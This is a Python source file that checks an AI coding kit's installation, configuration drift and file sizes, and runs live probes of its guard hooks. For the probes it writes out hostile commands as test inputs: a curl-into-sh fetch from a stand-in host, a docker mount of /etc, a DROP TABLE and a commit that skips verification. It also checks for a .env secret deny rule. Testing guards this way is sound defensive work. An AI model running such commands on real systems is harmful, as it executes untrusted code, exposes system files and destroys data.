"""The report, install and drift checks, live probes and event log of check.py."""

# ruff: noqa: F403, F405
from __future__ import annotations

import calendar
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile
import time

from check_base import *

# ---------------------------------------------------------------- checks


class Check:
    """One run: the install being checked and the findings so far."""

    def __init__(
        self, home: str, quick: bool, days: int = 7, session: str = ""
    ) -> None:
        self.home = home
        self.quick = quick
        self.days = days
        self.session = session
        self.window = f"last {plural(days, 'day')}" + (
            f", session {session}" if session else ""
        )
        self.remote = True  # False: use a cached answer, do not ask the remote
        self.update: dict = {}
        self.items: list[dict] = []
        self.activity: list[dict] = []  # one entry per rule that fired
        self.broken: set[str] = set()  # paths already reported as failed
        self.manifest, self.manifest_err = load_json(
            os.path.join(home, "pipelinekit", "manifest.json")
        )
        if self.manifest is not None and manifest_problem(self.manifest):
            self.manifest_err = f"damaged ({manifest_problem(self.manifest)})"
            self.manifest = None
        self.settings, self.settings_err = load_json(
            os.path.join(home, "settings.json")
        )
        hooks = as_dict(self.settings).get("hooks", {})
        self.hooks_block = isinstance(hooks, dict)

    def add(self, section: str, level: str, msg: str, fix: str = "") -> None:
        item = {"section": section, "level": level, "msg": clean(msg)}
        if fix:
            item["fix"] = clean(fix)
        self.items.append(item)

    def count(self, level: str) -> int:
        return sum(i["level"] == level for i in self.items)

    def path(self, rel: str) -> str:
        return os.path.join(self.home, rel)


def check_script(c: Check, kind: str, rel: str) -> None:
    """A hook must exist, be executable and have a shebang the kernel can run."""
    name = os.path.basename(rel)
    why = ""
    if not os.path.isfile(c.path(rel)):
        why = f"{kind} missing: {name}"
    elif not os.access(c.path(rel), os.X_OK):
        why = f"{kind} not executable: {name}"
    else:
        with open(c.path(rel), "rb") as f:
            if f.readline().endswith(b"\r\n"):
                why = f"{kind} has CRLF line endings and cannot start: {name}"
    if why:
        c.broken.add(rel)
        c.add("install", "fail", why)
    else:
        c.add("install", "pass", f"{kind}: {name}")


def check_settings(c: Check) -> None:
    if c.settings is None:
        c.add("install", "fail", f"settings.json: {c.settings_err}")
        return
    user_home = os.path.expanduser("~")
    bad = []
    if not c.hooks_block:
        bad.append("hooks is not an object")
    for event, groups in as_dict(c.settings.get("hooks")).items():
        where = plain(event, PLAIN_EVENT) or "one event"
        if not isinstance(groups, list):
            bad.append(f"the hooks under {where} are not a list")
            continue
        for g in groups:
            entries = g.get("hooks") if isinstance(g, dict) else None
            if not isinstance(entries, list):
                bad.append(f"a hook group under {where} has no list of hooks")
                continue
            if not isinstance(g.get("matcher", ""), str):
                bad.append(f"a hook group under {where} has a matcher that is not text")
            for h in entries:
                if not isinstance(h, dict):
                    bad.append(f"a hook under {where} is not an object")
                    continue
                cmd = h.get("command")
                if cmd is not None and not isinstance(cmd, str):
                    bad.append(f"a hook under {where} has a command that is not text")
                    continue
                # the program only: what follows it is not ours to repeat
                first = os.path.expanduser(((cmd or "").split() or [""])[0])
                first = first.replace("${HOME}", user_home).replace("$HOME", user_home)
                if first.startswith("/") and not os.path.exists(first):
                    ok = clean(first) == first and len(first) <= MAX_PATH_SHOWN
                    shown = first if ok else "a path that cannot be shown"
                    bad.append(f"hook command not found: {shown}")
    a = c.settings.get("attribution")
    off = a is False or (as_dict(a).get("commit") == "" and as_dict(a).get("pr") == "")
    if not off:
        bad.append("attribution not disabled")
    if "Read(.env)" not in as_list(as_dict(c.settings.get("permissions")).get("deny")):
        bad.append("secret deny rules missing")
    for why in dict.fromkeys(bad):
        c.add("install", "fail", f"settings.json: {why}")
    if not bad:
        c.add(
            "install",
            "pass",
            "settings.json: hook commands resolve, attribution off, deny rules present",
        )


def check_hooks_path(c: Check) -> None:
    want = c.path("git-hooks")
    cur = git_value("config", "--global", "--get", "core.hooksPath")
    was = str(as_dict(c.manifest).get("hooks_path") or "")
    if same_path(cur, want):
        c.add("install", "pass", "git: global core.hooksPath set")
    elif same_path(was, want):
        c.add(
            "install",
            "fail",
            f"git: global core.hooksPath pointed at the kit when it was installed, "
            f"now '{cur or 'unset'}': the kit's git hooks do not run",
            fix=f"git config --global core.hooksPath {want}",
        )
    else:
        c.add(
            "install",
            "info",
            f"global core.hooksPath is '{cur or 'unset'}' (kit git hooks inactive)",
        )


def check_install(c: Check) -> None:
    if os.name == "nt" or sys.platform in ("cygwin", "msys"):
        c.add(
            "install",
            "fail",
            "native Windows shell: the hooks only run on Linux, macOS or WSL",
        )
    for rel in ("CLAUDE.md", "config/never-stage.txt"):
        if os.path.isfile(c.path(rel)):
            c.add("install", "pass", f"exists: {rel}")
        else:
            c.broken.add(rel)
            c.add("install", "fail", f"missing: {rel}")
    try:
        with open(c.path("CLAUDE.md"), encoding="utf-8", errors="replace") as f:
            text = f.read()
    except OSError:
        text = ""
    if any(p in text for p in PLACEHOLDERS):
        c.add("install", "fail", "CLAUDE.md has unrendered placeholders")
    elif text:
        c.add("install", "pass", "CLAUDE.md rendered")
    for h in HOOKS:
        check_script(c, "hook", f"hooks/{h}")
    for h in HELPERS:
        rel = f"hooks/{h}"
        if os.path.isfile(c.path(rel)):
            c.add("install", "pass", f"hook helper: {h}")
        else:
            c.broken.add(rel)
            c.add(
                "install",
                "fail",
                f"hook helper missing: {h} ({HELPER_LOSS[h]})",
            )
    for g in GIT_HOOKS:
        check_script(c, "git hook", f"git-hooks/{g}")
    check_hooks_path(c)
    listed = as_list(as_dict(c.manifest).get("skills")) or KIT_SKILLS
    odd = [s for s in listed if not plain(s, PLAIN_NAME)]
    if odd:
        c.add(
            "install",
            "fail",
            f"install manifest lists {plural(len(odd), 'skill name')} "
            "no kit skill has: run the installer once",
        )
    for s in listed:
        if s in odd:
            continue
        rel = f"skills/{s}/SKILL.md"
        if os.path.isfile(c.path(rel)):
            c.add("install", "pass", f"skill: {s}")
        else:
            c.broken.add(rel)
            c.add("install", "fail", f"skill missing: {s}")
    for a in KIT_AGENTS:
        rel = f"agents/{a}"
        if os.path.isfile(c.path(rel)):
            c.add("install", "pass", f"agent: {a}")
        else:
            c.broken.add(rel)
            c.add("install", "fail", f"agent missing: {a}: run the installer")
    check_judge_tools(c)
    check_settings(c)


def frontmatter(text: str) -> list[str] | None:
    """The lines between the opening and the closing --- of a markdown file.

    Only an unindented --- opens or closes it.
    """
    lines = text.replace("\r", "").split("\n")
    if not lines or lines[0].rstrip() != "---":
        return None
    for i in range(1, len(lines)):
        if lines[i].rstrip() == "---":
            return lines[1:i]
    return None


def check_judge_tools(c: Check) -> None:
    """kit-judge.md must allow exactly the reading tools, through one tools line."""
    path = c.path("agents/kit-judge.md")
    if not os.path.isfile(path):
        return  # reported as missing
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            head = frontmatter(f.read(65536))
    except OSError:
        head = None
    # Only a key at column 0 is the tools key. Any other line whose key reads
    # tools (indented, inside a block scalar, or quoted) makes the file suspect,
    # and so does any indented line: YAML joins it to the value above it.
    tools, other = [], False
    for line in head or []:
        if re.match(r"tools\s*:", line):
            tools.append(line.split(":", 1)[1])
        elif line.startswith((" ", "\t")) or (
            ":" in line and line.split(":", 1)[0].strip(" \t\"'") == "tools"
        ):
            other = True
    if (
        not other
        and len(tools) == 1
        and tuple(t.strip() for t in tools[0].split(",")) == JUDGE_TOOLS
    ):
        c.add("install", "pass", "kit-judge.md only reads")
    else:
        c.add(
            "install",
            "fail",
            "kit-judge.md allows more than reading: run the installer",
        )


def drift_files(c: Check, files: dict) -> None:
    missing: dict[str, list[str]] = {}
    changed, same = [], 0
    gone = tuple(os.path.dirname(b) + "/" for b in c.broken if b.endswith("/SKILL.md"))
    odd = [rel for rel in files if not SAFE_REL.fullmatch(rel)]
    if odd:
        c.add(
            "drift",
            "fail",
            f"install manifest lists {plural(len(odd), 'name')} no kit file has: "
            "run the installer once",
        )
    for rel, digest in sorted(files.items()):
        if rel in odd or (c.quick and not rel.startswith(("hooks/", "git-hooks/"))):
            continue
        if gone and rel.startswith(gone):
            continue  # the whole skill is already reported as missing
        if not os.path.isfile(c.path(rel)):
            if rel not in c.broken:
                missing.setdefault("/".join(rel.split("/")[:2]), []).append(rel)
        elif not digest or sha256(c.path(rel)) != digest:
            changed.append(rel)
        else:
            same += 1
    for group, rels in missing.items():
        if len(rels) == 1:
            c.add("drift", "fail", f"missing: {rels[0]}")
        else:
            c.add("drift", "fail", f"missing: {len(rels)} files under {group}/")
    if changed:
        c.add(
            "drift",
            "warn",
            f"changed since install: {names(changed)} "
            "(fine if you edited them; the installer restores the kit's copy)",
        )
    if same:
        c.add("drift", "pass", f"{plural(same, 'file')} unchanged since install")


def drift_settings(c: Check, kit: dict) -> None:
    if c.settings is None:
        return  # reported by the install section
    wired = set()
    for event, groups in as_dict(c.settings.get("hooks")).items():
        for g in as_list(groups):
            for h in as_list(as_dict(g).get("hooks")):
                h = as_dict(h)
                matcher = as_dict(g).get("matcher", "")
                wired.add(
                    wiring(event, matcher, h.get("command", ""), h.get("args", []))
                )
    # A hooks block of the wrong type is named by the install section.
    entries = [as_dict(e) for e in as_list(kit.get("hooks"))] if c.hooks_block else []
    lost = odd = 0
    for e in entries:
        key = (e.get("event"), e.get("matcher"), e.get("command"))
        if wiring(*key, e.get("args", [])) in wired:
            continue
        lost += 1
        event = plain(e.get("event"), PLAIN_EVENT)
        matcher = e.get("matcher") or ""
        name = plain(os.path.basename(e.get("command") or ""), PLAIN_NAME)
        args = as_list(e.get("args"))
        if not (
            event
            and name
            and PLAIN_MATCHER.fullmatch(matcher)
            and all(plain(a, PLAIN_NAME) for a in args)
        ):
            odd += 1
            continue
        c.add(
            "drift",
            "fail",
            f"settings.json: kit hook no longer wired: "
            f"{event} {matcher} -> {' '.join([name, *args])}",
        )
    if odd:
        c.add(
            "drift",
            "fail",
            f"install manifest lists {plural(odd, 'hook')} with names no kit hook "
            "has: run the installer once",
        )
    if entries and not lost:
        c.add("drift", "pass", f"settings.json: {len(entries)} kit hook entries wired")
    perms = as_dict(c.settings.get("permissions"))
    for kind, level in (("deny", "fail"), ("ask", "warn")):
        rules = as_list(kit.get(kind))
        gone = [r for r in rules if r not in as_list(perms.get(kind))]
        if gone:
            shown = [r for r in gone if plain(r, PLAIN_RULE)][:3]
            more = len(gone) - len(shown)
            text = ", ".join(shown) + (f" and {more} more" if shown and more else "")
            c.add(
                "drift",
                level,
                f"settings.json: {plural(len(gone), f'kit {kind} rule')} missing"
                + (f": {text}" if text else ""),
            )
        elif rules:
            c.add("drift", "pass", f"settings.json: {len(rules)} kit {kind} rules")


def check_drift(c: Check) -> None:
    if c.manifest is None:
        why = "not found" if c.manifest_err == "missing" else c.manifest_err
        c.add("drift", "fail", f"install manifest {why}: run the installer once")
        return
    files = as_dict(c.manifest.get("files"))
    if not files:
        c.add(
            "drift", "fail", "install manifest lists no files: run the installer once"
        )
        return
    drift_files(c, files)
    drift_settings(c, as_dict(c.manifest.get("settings")))
    if not c.quick:
        check_file_sizes(c, files)


# ---------------------------------------------------------------- file sizes

# A file the pre-commit probe stages: over the limit by lines and by bytes.
PROBE_BIG = "kit-probe-big.txt"
PROBE_BIG_TEXT = "x = 1  # a line of the kit's file size probe\n" * 2000


SIZE_CHECK = "hooks/filesize.py"


def sizes_not_checked(c: Check, what: str, e: BaseException) -> None:
    why = clean(f"{type(e).__name__}: {e}", 160)
    c.add(
        "install",
        "warn",
        f"kit file sizes not checked: {SIZE_CHECK} {what} ({why})",
        fix="install the kit again",
    )


def size_rules(c: Check):
    """The installed filesize.py as a module; None when it is missing, which
    is reported as missing, or does not load, which gets a warning."""
    if SIZE_CHECK in c.broken:
        return None
    try:
        spec = importlib.util.spec_from_file_location(
            "kit_filesize", c.path(SIZE_CHECK)
        )
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        int(mod.MAX_LINES), int(mod.MAX_BYTES), tuple(mod.DEFAULT_EXEMPT)
    except (Exception, SystemExit) as e:
        sizes_not_checked(c, "does not load", e)
        return None
    return mod


def check_file_sizes(c: Check, files: dict) -> None:
    """Hand-written kit files over the limit the pre-commit hook holds.

    The vendored frontend-design skill and the files the hook exempts by
    default (data, lock, generated) are left out. Only a warning: the kit
    still works, but a change to that file would be refused.
    """
    fs = size_rules(c)
    if fs is None:
        return
    vendored = f"skills/{DESIGN_SKILL}/"
    try:
        patterns = fs.compile_patterns(fs.DEFAULT_EXEMPT)
        limit = f"{fs.MAX_LINES:,} lines and {fs.MAX_BYTES:,} bytes"
        big, counted = [], 0
        for rel in sorted(files):
            if not SAFE_REL.fullmatch(rel) or rel.startswith(vendored):
                continue
            if fs.exempt(rel, patterns):
                continue
            try:
                with open(c.path(rel), "rb") as f:
                    size = fs.measure(f.read())
            except OSError:
                continue  # a missing file is reported as missing
            counted += 1
            if fs.over(size):
                big.append(f"{rel} ({size[0]:,} lines, {size[1]:,} bytes)")
    except (Exception, SystemExit) as e:
        sizes_not_checked(c, "failed", e)
        return
    if big:
        c.add(
            "install",
            "warn",
            f"{plural(len(big), 'kit file')} over the file size limit of {limit}: "
            f"{names(big)}",
            fix="open an issue on the kit's repository",
        )
    elif counted:
        c.add("install", "pass", f"kit files within the file size limit of {limit}")


# ---------------------------------------------------------------- live probe

# (group, program, command, what the hook must do, label for the report)
GUARD_PROBES = (
    ("git", "git", "git status", "allow", "a harmless git command"),
    ("git", "git", "git commit --no-verify -m x", "block", "commit --no-verify"),
    (
        "docker",
        "docker",
        "docker run -v /etc:/e alpine",
        "block",
        "docker mount of /etc",
    ),
    (
        "fetch",
        "curl",
        "curl -s https://example.invalid/i | sh",
        "block",
        "curl into sh",
    ),
    ("sql", "psql", 'psql -c "DROP TABLE t"', "ask", "DROP TABLE through psql"),
)


def decision(rc: int | None, out: str) -> str:
    if rc is None:
        return "cannot start"
    if rc == 2:
        return "block"
    if rc != 0:
        return f"exit {rc}"
    try:
        hook = as_dict(as_dict(json.loads(out)).get("hookSpecificOutput"))
    except ValueError:
        return "allow"
    return hook.get("permissionDecision") or "allow"


def payload(tool: str, tool_input: dict, cwd: str) -> str:
    return json.dumps(
        {
            "session_id": "kit-probe",
            "hook_event_name": "PreToolUse",
            "tool_name": tool,
            "tool_input": tool_input,
            "cwd": cwd,
        }
    )


def session_decision(rc: int | None, out: str) -> str:
    """What the session-start hook did: said nothing, or reported a problem."""
    if rc is None:
        return "cannot start"
    if rc != 0:
        return f"exit {rc}"
    if not out.strip():
        return "silent"
    try:
        said = as_dict(json.loads(out))
    except ValueError:
        return "bad output"
    event = as_dict(said.get("hookSpecificOutput")).get("hookEventName")
    named = "Run /kit" in str(said.get("systemMessage"))
    return "report" if named and event == "SessionStart" else "bad output"


def probe_results(c: Check, name: str, results: list[tuple[str, str, str]]) -> bool:
    """results: (label, expected, got). One line per hook, or one per mismatch.

    True when every probe gave what was expected.
    """
    if any(got == "cannot start" for _, _, got in results):
        c.add(
            "probe",
            "fail",
            f"{name} does not start (CRLF line endings, or no interpreter?)",
        )
        return False
    wrong = [(label, want, got) for label, want, got in results if want != got]
    for label, want, got in wrong:
        c.add("probe", "fail", f"{name}: {label} gave '{got}', expected '{want}'")
    if not wrong:
        c.add("probe", "pass", f"{name}: {plural(len(results), 'probe')} as expected")
    return not wrong


def probe(c: Check) -> None:
    with tempfile.TemporaryDirectory(prefix="kit-probe-") as tmp:
        env = dict(
            os.environ,
            CLAUDE_HOME=c.home,
            PIPELINEKIT_STATE_DIR=os.path.join(tmp, "state"),
            GIT_CEILING_DIRECTORIES=tmp,
        )
        for k in (
            "ALLOW_MAIN_PUSH",
            "PIPELINEKIT_ALLOW_SECRET",
            "PIPELINEKIT_LOG",
            "PIPELINEKIT_SESSION_CHECK",
            # The caller's repository: the probes stage files, and must only
            # ever stage them in the temp repository.
            "GIT_DIR",
            "GIT_WORK_TREE",
            "GIT_INDEX_FILE",
            "GIT_OBJECT_DIRECTORY",
            "GIT_ALTERNATE_OBJECT_DIRECTORIES",
            "GIT_COMMON_DIR",
            "GIT_PREFIX",
        ):
            env.pop(k, None)
        for k in [k for k in env if k.startswith("GITHEAD_")]:
            env.pop(k)
        expected: list[tuple[str, str]] = []  # (hook, rule) a probe must have logged

        def log_check() -> None:
            if "hooks/kitlog.py" in c.broken or not expected:
                return
            events = read_events(env["PIPELINEKIT_STATE_DIR"])
            logged = {(e["hook"], e["rule"]) for e in events}
            silent = [hook for hook, rule in expected if (hook, rule) not in logged]
            if silent:
                c.add(
                    "probe",
                    "fail",
                    f"event log: nothing recorded for {names(silent)}",
                )
            else:
                done = plural(len(expected), "refusal")
                c.add("probe", "pass", f"event log: {done} recorded")

        plain = os.path.join(tmp, "plain")
        repo = os.path.join(tmp, "repo")
        os.makedirs(os.path.join(plain, "refs"))
        os.makedirs(repo)

        def hook(rel: str, args: list[str], stdin: str, cwd: str) -> str:
            rc, out, _ = run([c.path(rel), *args], stdin=stdin, env=env, cwd=cwd)
            return decision(rc, out)

        rel = "hooks/bash-guard.py"
        if rel not in c.broken:
            results = [
                (
                    label,
                    want,
                    hook(
                        rel,
                        [grp, prog],
                        payload("Bash", {"command": cmd}, plain),
                        plain,
                    ),
                )
                for grp, prog, cmd, want, label in GUARD_PROBES
            ]
            if probe_results(c, "bash-guard.py", results):
                expected.append(("bash-guard", "git.no-verify"))

        rel = "hooks/block-bare-repo-markers.py"
        if rel not in c.broken:
            results = [
                (
                    label,
                    want,
                    hook(
                        rel,
                        [],
                        payload("Write", {"file_path": f, "content": "x"}, plain),
                        plain,
                    ),
                )
                for f, want, label in (
                    ("notes.txt", "allow", "an ordinary file"),
                    ("HEAD", "block", "HEAD next to refs/"),
                )
            ]
            if probe_results(c, "block-bare-repo-markers.py", results):
                expected.append(("block-bare-repo-markers", "bare-repo.marker"))

        rel = "hooks/post-edit-format.sh"
        if rel not in c.broken:
            probe_results(
                c,
                "post-edit-format.sh",
                [("empty input", "allow", hook(rel, [], "{}", plain))],
            )

        # The session-start check runs the installed check.py in quick mode.
        rel = "hooks/session-check.py"
        if rel not in c.broken and os.path.isfile(c.path("skills/kit/check.py")):
            script = c.path(rel)
            bare = os.path.join(tmp, "bare-home")
            os.makedirs(bare)
            start = json.dumps(
                {
                    "session_id": "kit-probe",
                    "hook_event_name": "SessionStart",
                    "source": "startup",
                    "cwd": plain,
                }
            )

            def session(home: str) -> str:
                at = dict(env, CLAUDE_HOME=home)
                rc, out, _ = run([script], stdin=start, env=at, cwd=plain)
                return session_decision(rc, out)

            results = [("an install with nothing in it", "report", session(bare))]
            if not c.count("fail"):
                results.append(("this install", "silent", session(c.home)))
            probe_results(c, "session-check.py", results)

        rc, _, _ = run(["git", "init", "-q", "--template=", repo], env=env)
        if rc != 0:
            c.add(
                "probe", "warn", "git hooks not probed: git init failed in a temp dir"
            )
            log_check()
            return
        good, bad = os.path.join(tmp, "good"), os.path.join(tmp, "bad")
        with open(good, "w", encoding="utf-8") as f:
            f.write("feat: add a probe\n")
        with open(bad, "w", encoding="utf-8") as f:
            f.write("updated some stuff\n")

        def git_hook(rel: str, args: list[str], stdin: str = "") -> str:
            rc, _, _ = run([c.path(rel), *args], stdin=stdin, env=env, cwd=repo)
            return "cannot start" if rc is None else "accept" if rc == 0 else "reject"

        def size_hook(rel: str) -> str:
            """git_hook() for the file size limit: a refusal counts only when
            it names its rule, and a hook that hangs is told apart."""
            try:
                p = subprocess.run(
                    [c.path(rel)],
                    stdin=subprocess.DEVNULL,
                    capture_output=True,
                    text=True,
                    errors="replace",
                    env=env,
                    cwd=repo,
                    timeout=10,
                )
            except subprocess.TimeoutExpired:
                return "timed out"
            except OSError:
                return "cannot start"
            if p.returncode == 0:
                return "accept"
            if "[pre-commit.file-size]" in p.stderr:
                return "reject"
            return "reject without [pre-commit.file-size]"

        rel = "git-hooks/commit-msg"
        if rel not in c.broken:
            results = [
                ("a conventional message", "accept", git_hook(rel, [good])),
                ("a non-conventional message", "reject", git_hook(rel, [bad])),
            ]
            if probe_results(c, "commit-msg", results):
                expected.append(("commit-msg", "commit-msg.format"))
        # pre-commit and pre-merge-commit (run by `git merge`) both hold the
        # file size limit: each lets an empty commit through, then refuses one
        # that adds a file over the limit.
        sized = {
            n: [("nothing staged", "accept", git_hook(f"git-hooks/{n}", []))]
            for n in ("pre-commit", "pre-merge-commit")
            if f"git-hooks/{n}" not in c.broken
        }
        if sized and "hooks/filesize.py" not in c.broken:
            with open(os.path.join(repo, PROBE_BIG), "w", encoding="utf-8") as f:
                f.write(PROBE_BIG_TEXT)
            rc, _, err = run(["git", "add", "-f", PROBE_BIG], env=env, cwd=repo)
            if rc == 0:
                for n, results in sized.items():
                    over = size_hook(f"git-hooks/{n}")
                    results.append(("a file over the size limit", "reject", over))
            else:
                why = (err.strip().splitlines() or ["no message"])[0]
                c.add(
                    "probe",
                    "warn",
                    f"file size limit not probed: git add failed in a temp dir ({why})",
                )
        for n, results in sized.items():
            if probe_results(c, n, results) and len(results) > 1:
                expected.append((n, "pre-commit.file-size"))
        rel = "git-hooks/pre-push"
        if rel not in c.broken:
            a, z = "1" * 40, "0" * 40
            args = ["origin", "https://example.invalid/probe.git"]
            results = [
                (label, want, git_hook(rel, args, f"refs/heads/probe {a} {ref} {z}\n"))
                for ref, want, label in (
                    ("refs/heads/probe", "accept", "push of a branch"),
                    ("refs/heads/main", "reject", "push to main"),
                )
            ]
            if probe_results(c, "pre-push", results):
                expected.append(("pre-push", "pre-push.protected-branch"))
        log_check()


# ---------------------------------------------------------------- event log


def env_dir(name: str) -> str:
    """A directory named in the environment: a leading ~ is expanded, and a
    path that is still relative is not used (it would depend on where a hook
    runs)."""
    value = os.path.expanduser(os.environ.get(name) or "")
    return value if os.path.isabs(value) else ""


def state_dir() -> str:
    """Where the hooks keep their event log (the same rule as kitlog.py)."""
    explicit = env_dir("PIPELINEKIT_STATE_DIR")
    if explicit:
        return explicit
    base = env_dir("XDG_STATE_HOME") or os.path.join(
        os.path.expanduser("~"), ".local", "state"
    )
    return os.path.join(base, "pipelinekit")


def event_time(ts: object) -> int | None:
    if not isinstance(ts, str):
        return None
    try:
        return calendar.timegm(time.strptime(ts, "%Y-%m-%dT%H:%M:%SZ"))
    except ValueError:
        return None


def read_events(directory: str) -> list[dict]:
    """Every well-formed event in the log, older file first. Never raises."""
    events = []
    for name in ("events.jsonl.1", "events.jsonl"):
        path = os.path.join(directory, name)
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "rb") as f:
                raw = f.read(MAX_LOG_BYTES)
        except OSError:
            continue
        for line in raw.split(b"\n"):
            try:
                e = json.loads(line.decode("utf-8", "replace"))
            except (ValueError, RecursionError):
                continue
            if not isinstance(e, dict):
                continue
            kind, hook, rule = e.get("kind"), e.get("hook"), e.get("rule")
            when = event_time(e.get("ts"))
            if (
                isinstance(kind, str)
                and kind in EVENT_KINDS
                and isinstance(hook, str)
                and EVENT_HOOK.match(hook)
                and isinstance(rule, str)
                and EVENT_RULE.match(rule)
                and when is not None
            ):
                e["when"] = when
                events.append(e)
    return events
